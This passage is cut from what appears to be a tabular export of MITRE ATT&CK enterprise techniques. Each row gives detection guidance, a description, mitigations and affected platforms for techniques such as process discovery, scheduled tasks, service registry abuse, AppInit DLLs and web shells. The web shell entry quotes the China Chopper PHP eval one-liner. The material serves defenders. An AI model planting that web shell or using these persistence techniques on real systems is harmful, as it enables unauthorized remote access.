'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],[],"['Collection', 'Credential Access']",Technique/T1056,['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
1546,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']","['Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software running on systems within the network.\n\n===Windows===\n\nAn example command that would obtain details on processes is ""tasklist"" using the [[Software/S0057|Tasklist]] utility.\n\n===Mac and Linux===\n\nIn Mac and Linux, this is accomplished with the <code>ps</code> command.']",[],[],[],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']",[],['Discovery'],Technique/T1057,['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
1547,"['Monitor service creation through changes in the Registry and common utilities using command-line invocation. New, benign services may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence.[[CiteRef::TechNet Autoruns]] Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could create services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['550'],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']","[""When operating systems boot up, they can start programs or applications called services that perform background system functions.[[CiteRef::TechNet Services]] A service's configuration information, including the file path to the service's executable, is stored in the Windows Registry. \n\nAdversaries may install a new service that can be configured to execute at startup by using utilities to interact with services or by directly modifying the Registry. The service name may be disguised by using a name from a related operating system or benign software with [[Technique/T1036|Masquerading]]. Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through [[Technique/T1035|Service Execution]].""]",[],[],[],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only  authorized administrators can create new services.\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to create services by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],"['Persistence', 'Privilege Escalation']",Technique/T1050,['New Service'],https://attack.mitre.org/wiki/Technique/T1050
1548,['Use file and process monitoring to detect when files are written to a Web server by a process that is not the normal Web server process or when files are written outside of normal administrative time periods. Use process monitoring to identify normal processes that run on the Web server and detect processes that are not typically executed.'],[],['563'],[],"['File monitoring', 'Process monitoring']","[""Adversaries may add malicious content to an internally accessible website through an open network file share that contains the website's webroot or Web content directory and then browse to that content with a Web browser to cause the server to execute the malicious content. The malicious content will typically run under the context and permissions of the Web server process, often resulting in local system or administrative privileges, depending on how the Web server is configured.\n\nThis mechanism of shared access and remote execution could be used for lateral movement to the system running the Web server. For example, a Web server running PHP with an open network share could allow an adversary to upload a remote access tool and PHP script to execute the RAT on the system running the Web server when a specific page is visited.""]",[],[],[],"['Networks that allow for open development and testing of Web content and allow users to set up their own Web servers on the enterprise network may be particularly vulnerable if the systems and Web servers are not properly secured to limit privileged account use, unauthenticated network share access, and network/system isolation.\n\nEnsure proper permissions on directories that are accessible through a Web server. Disallow remote access to the webroot or other directories used to serve Web content. Disable execution on directories within the webroot. Ensure that permissions of the Web server process are only what is required by not using built-in accounts; instead, create specific accounts to limit unnecessary access or permissions overlap across multiple systems.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],['Shared webroot directory on remote system'],[],['Lateral Movement'],Technique/T1051,['Shared Webroot'],https://attack.mitre.org/wiki/Technique/T1051
1549,['Monitor file access on removable media. Detect processes that execute when removable media are mounted.'],[],[],[],"['Data loss prevention', 'File monitoring']","['In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.']",[],[],[],['Disable Autorun if it is unnecessary.[[CiteRef::Microsoft Disable Autorun]] Disallow or restrict removable media at an organizational policy level if they are not required for business operations.[[CiteRef::TechNet Removable Media Control]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Presence of physical medium or device'],[],['Exfiltration'],Technique/T1052,['Exfiltration Over Physical Medium'],https://attack.mitre.org/wiki/Technique/T1052
1550,"['Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Monitor process execution from the Windows Task Scheduler <code>taskeng.exe</code>. If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in <code>%systemroot%\\System32\\Tasks</code> for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks.[[CiteRef::TechNet Autoruns]] Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could be taken to create tasks. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['557'],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']","['Utilities such as [[Software/S0110|at]] and [[Software/S0111|schtasks]], along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. The account used to create the task must be in the Administrators group on the local system. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on.[[CiteRef::TechNet Task Scheduler Security]]\n\nAn adversary may use task scheduling to execute programs at system startup or on a scheduled basis for persistence, to conduct remote [[Execution]] as part of [[Lateral Movement]], to gain SYSTEM privileges, or to run a process under the context of a specified account.']",[],[],[],"['Limit privileges of user accounts and remediate [[Privilege Escalation]] vectors so only authorized administrators can create scheduled tasks. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges.[[CiteRef::Powersploit]]\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to schedule tasks using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],"['Execution', 'Persistence', 'Privilege Escalation']",Technique/T1053,['Scheduled Task'],https://attack.mitre.org/wiki/Technique/T1053
1551,"['Service changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path is changed to a location that is not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information.[[CiteRef::TechNet Autoruns]] Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could be done to modify services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be changed through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['203'],[],"['Process command-line parameters', 'Services', 'Windows Registry']","[""Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, PowerShell, or [[Software/S0075|Reg]]. Access to Registry keys is controlled through Access Control Lists and permissions.[[CiteRef::MSDN Registry Key Security]]\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).""]",[],[],[],['Identify and block potentially malicious software that may be executed through service abuse by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] that are capable of auditing and/or blocking unknown programs.'],"['Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM']",['Ability to modify a service binPath/ImagePath value in the Registry'],[],"['Persistence', 'Privilege Escalation']",Technique/T1058,['Service Registry Permissions Weakness'],https://attack.mitre.org/wiki/Technique/T1058
1552,"[""Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.""]",[],[],[],"['Process command-line parameters', 'Process monitoring']","['Command-line interfaces provide a way of interacting with computer systems and is a common feature across many types of operating system platforms.[[CiteRef::Wikipedia Command-Line Interface]] One example command-line interface on Windows systems is [[Software/S0106|cmd]], which can be used to perform a number of tasks including execution of other software. Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc. Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g. [[Technique/T1053|Scheduled Task]]).\n\nAdversaries may use command-line interfaces to interact with systems and execute other software during the course of an operation.']",[],[],[],"['Audit and/or block command-line interpreters by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],[],['Execution'],Technique/T1059,['Command-Line Interface'],https://attack.mitre.org/wiki/Technique/T1059
1553,"['Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Host network interface', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Packet capture']","['Adversaries may use an existing, legitimate external Web service as a means for relaying commands to a compromised system.\n\nPopular websites and social media can act as a mechanism for command and control and give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.']",[],[],[],"['Firewalls and Web proxies can be used to enforce external network communication policy. It may be difficult for an organization to block particular services because so many of them are commonly used during the course of business.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol or encoded commands used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Command and Control'],Technique/T1102,['Web Service'],https://attack.mitre.org/wiki/Technique/T1102
1554,"['Monitor DLL loads by processes that load user32.dll and look for DLLs that are not recognized or not normally loaded into a process. Monitor the AppInit_DLLs Registry value for modifications that do not correlate with known software, patch cycles, etc. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current AppInit DLLs.[[CiteRef::TechNet Autoruns]] \n\nLook for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for [[Command and Control]], learning details about the environment through [[Discovery]], and conducting [[Lateral Movement]].']",[],[],[],"['Loaded DLLs', 'Process monitoring', 'Windows Registry']",['DLLs that are specified in the AppInit_DLLs value in the Registry key <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program. This value can be abused to obtain persistence by causing a DLL to be loaded into most processes on the computer.[[CiteRef::AppInit Registry]]\n\nThe AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled.[[CiteRef::AppInit Secure Boot]]'],[],[],[],"['Upgrade to Windows 8 or later and enable secure boot.\n\nIdentify and block potentially malicious software that may be executed through AppInit DLLs by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] that are capable of auditing and/or blocking unknown DLLs.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],['Secure boot disabled on systems running Windows 8 and later'],[],"['Persistence', 'Privilege Escalation']",Technique/T1103,['AppInit DLLs'],https://attack.mitre.org/wiki/Technique/T1103
1555,"[""Web shells can be difficult to detect. Unlike other forms of persistent remote access, they do not initiate connections. The portion of the Web shell that is on the server may be small and innocuous looking. The PHP version of the China Chopper Web shell, for example, is the following short payload:[[CiteRef::Lee 2013]]\n\n<code><?php @eval($_POST['password']);></code>\n\nNevertheless, detection mechanisms exist. Process monitoring may be used to detect Web servers that perform suspicious actions such as running [[Software/S0106|cmd]] or accessing files that are not in the Web directory. File monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server's content and may indicate implantation of a Web shell script. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network.[[CiteRef::US-CERT Alert TA15-314A Web Shells]]""]",[],[],[],"['Anti-virus', 'File monitoring', 'Process monitoring', 'Authentication logs', 'Netflow/Enclave netflow']","[""A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (see, for example, China Chopper Web shell client).[[CiteRef::Lee 2013]]\n\nWeb shells may serve as [[Technique/T1108|Redundant Access]] or as a persistence mechanism in case an adversary's primary access methods are detected and removed.""]",[],[],[],['Ensure that externally facing Web servers are patched regularly to prevent adversary access through [[Technique/T1068|Exploitation of Vulnerability]] to gain remote code access or through file inclusion weaknesses that may allow adversaries to upload files or scripts that are automatically served as Web pages. \n\nAudit account and group permissions to ensure that accounts used to manage servers do not overlap with accounts and permissions of users in the internal network that could be acquired through [[Credential Access]] and used to log into the Web server and plant a Web shell or pivot from the Web server into the internal network.[[CiteRef::US-CERT Alert TA15-314A Web Shells]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Adversary access to Web server with vulnerability or account to upload and serve the Web shell file.'],[],"['Persistence', 'Privilege Escalation']",Technique/T1100,['Web Shell'],https://attack.mitre.org/wiki/Technique/T1100
1556,['Monitor the Registry for changes to the SSP Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned SSP DLLs try to load into the LSA by setting the Registry key <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exe</code> with AuditLevel = 8.[[CiteRef::Graeber 2014]][[CiteRef::Microsoft Configure LSA]]'],[],[],[],"['DLL monitoring', 'Windows Registry', 'Loaded DLLs']","[""Windows Security Support Provider (SSP) DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.\n[[CiteRef::Graeber 2014]]""]",[],[],[],"['Windows 8.1, Windows Server 2012 R2, and later versions may make LSA run as a Protected Process Light (PPL) by setting the Registry key <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL</code>, which requires all SSP DLLs to be signed by Microsoft.[[CiteRef::Graeber 2014]][[CiteRef::Microsoft Configure LSA]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],[],[],['Persistence'],Technique/T1101,['Security Support Provider'],https://attack.mitre.org/wiki/Technique/T1101
1557,"['Monitoring API calls may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances, since benign use of Windows API functions such as CreateProcess are common and difficult to distinguish from malicious behavior. Correlation of other events with behavior surrounding API function calls using API monitoring will provide additional context to an event that may assist in determining if it is due to malicious behavior. Correlation of activity by process lineage by process ID may be sufficient.']",[],[],['Stefan Kanthak'],"['API monitoring', 'Process monitoring']","['Adversary tools may directly use the Windows application programming interface (API) to execute binaries. Functions such as the Windows API CreateProcess will allow programs and scripts to start other processes with proper path and argument parameters.[[CiteRef::Microsoft CreateProcess]]\n\nAdditional Windows API calls that can be used to execute binaries include:[[CiteRef::Kanthak Verifier]]\n\n*CreateProcessA() and CreateProcessW(),\n*CreateProcessAsUserA() and CreateProcessAsUserW(),\n*CreateProcessInternalA() and CreateProcessInternalW(),\n*CreateProcessWithLogonW(), CreateProcessWithTokenW(),\n*LoadLibraryA() and LoadLibraryW(),\n*LoadLibraryExA() and LoadLibraryExW(),\n*LoadModule(),\n*LoadPackagedLibrary(),\n*WinExec(),\n*ShellExecuteA() and ShellExecuteW(),\n*ShellExecuteExA() and ShellExecuteExW()']",[],[],[],"['Mitigating specific API calls will likely have unintended side effects, such as preventing legitimate software from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identifying subsequent malicious behavior. Audit and/or block potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],[],['Execution'],Technique/T1106,['Execution through API'],https://attack.mitre.org/wiki/Technique/T1106
1558,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']","['Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces behind as to what was done within a network and how. Adversaries may remove these files over the course of an intrusion to keep their footprint low or remove them at the end as part of the post-intrusion cleanup process.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native [[Software/S0106|cmd]] functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools.[[CiteRef::Trend Micro APT Attack Tools]]']",[],[],[],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],[],['Defense Evasion'],Technique/T1107,['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1559,['Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure. Relating subsequent actions that may result from [[Discovery]] of the system and network information or [[Lateral Movement]] to the originating process may also yield useful data.'],[],[],[],"['Netflow/Enclave netflow', 'Network device logs', 'Network protocol analysis', 'Packet capture', 'Process use of network']","['Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.\n\nRemote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.\n\nThe different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or [[Technique/T1008|Fallback Channels]] in case the original first-stage communication path is discovered and blocked.']",[],[],[],"['Command and control infrastructure used in a multi-stage channel may be blocked if known ahead of time. If unique signatures are present in the C2 traffic, they could also be used as the basis of identifying and blocking the channel.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],Technique/T1104,['Multi-Stage Channels'],https://attack.mitre.org/wiki/Technique/T1104
1560,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']","['Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Files may be copied from an external adversary-controlled system through the [[Command and Control]] channel to bring tools into the victim network or through alternate protocols with another tool such as [[Software/S0095|FTP]]. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.\n\nAdversaries may also copy files laterally between internal victim systems to support [[Lateral Movement]] with remote [[Execution]] using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with [[Technique/T1077|Windows Admin Shares]] or [[Technique/T1076|Remote Desktop Protocol]].']",[],[],[],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],"['Command and Control', 'Lateral Movement']",Technique/T1105,['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1561,"['Existing methods of detecting remote access tools are helpful. Backup remote access tools or other access points may not have established command and control channels open during an intrusion, so the volume of data transferred may not be as high as the primary channel unless access is lost.\n\nDetection of tools based on beacon traffic, [[Command and Control]] protocol, or adversary infrastructure require prior threat intelligence on tools, IP addresses, and/or domains the adversary may use, along with the ability to detect use at the network boundary. Prior knowledge of indicators of compromise may also help detect adversary tools at the endpoint if tools are available to scan for those indicators.\n\nIf an intrusion is in progress and sufficient endpoint data or decoded command and control traffic is collected, then defenders will likely be able to detect additional tools dropped as the adversary is conducting the operation.\n\nFor alternative access using externally accessible VPNs or remote services, follow detection recommendations under [[Technique/T1078|Valid Accounts]] and [[Technique/T1133|External Remote Services]] to collect account use information.']","['Anti-virus', 'Network intrusion detection system']",[],[],"['Process monitoring', 'Process use of network', 'Packet capture', 'Network protocol analysis', 'File monitoring', 'Binary file metadata', 'Authentication logs']","[""Adversaries may use more than one remote access tool with varying command and control protocols as a hedge against detection. If one type of tool is detected and blocked or removed as a response but the organization did not gain a full understanding of the adversary's tools and access, then the adversary will be able to retain access to the network. Adversaries may also attempt to gain access to [[Technique/T1078|Valid Accounts]] to use [[Technique/T1133|External Remote Services]] such as external VPNs as a way to maintain access despite interruptions to remote access tools deployed within a target network.[[CiteRef::Mandiant APT1]]\n\nUse of a [[Technique/T1100|Web Shell]] is one such way to maintain access to a network through an externally accessible Web server.""]",[],[],[],"['Identify and block potentially malicious software that may be used as a remote access tool, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 